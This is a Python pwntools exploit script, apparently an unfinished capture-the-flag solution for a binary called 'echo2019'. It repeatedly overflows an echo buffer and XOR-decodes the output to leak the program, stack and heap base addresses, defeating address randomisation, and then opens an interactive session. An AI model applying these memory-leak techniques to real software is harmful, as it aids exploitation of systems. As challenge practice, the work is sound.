#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 1

filename = "./echo2019"
if LOCAL:
    p = process(filename)
else:
    remote_service = ""
    remote_service = remote_service.strip().split(":")
    p = remote(remote_service[0], int(remote_service[1]))
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)


rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("p.pid")
        input()
    pass


ru(b'Input text:')
payload = b""
payload += b"a"*0x50
sl(payload)
ru(b"Echo:")
data = ru(b'\n\nInput text:', "drop")
result = []
for i in range(len(data)):
    result.append(data[i] ^ 0x30)
result = bytes(result)
result = result.replace(b"a"*0x50, b"")
elf_base = uu64(result) - 0xbfa
lg("elf_base")

payload = b""
payload += b"a"*(0x50 + 8)
sl(payload)
ru(b"Echo:")
data = ru(b'\n\nInput text:', "drop")
result = []
for i in range(len(data)):
    result.append(data[i] ^ 0x30)
result = bytes(result)
result = result.replace(b"a"*0x58, b"")
#  lg("uu64(result)")
stack_base = uu64(result) + 0x70
lg("stack_base")

payload = b""
payload += b"a"*(0x50 + 16)
sl(payload)
ru(b"Echo:")
data = ru(b'\n\nInput text:', "drop")
result = []
for i in range(len(data)):
    result.append(data[i] ^ 0x30)
result = bytes(result)
result = result.replace(b"a"*0x60, b"")
#  lg("uu64(result)")
heap_base = uu64(result) - 0x10
lg("heap_base")

debugPID()
payload = b""
payload += b"a"*(0x50 + 16 + 8)
sl(payload)
ru(b"Echo:")
data = ru(b'\n\nInput text:', "drop")
result = []
for i in range(len(data)):
    result.append(data[i] ^ 0x30)
result = bytes(result)
result = result.replace(b"a"*0x68, b"")
lg("uu64(result)")
#  heap_base = uu64(result) - 0x10
#  lg("heap_base")


irt()
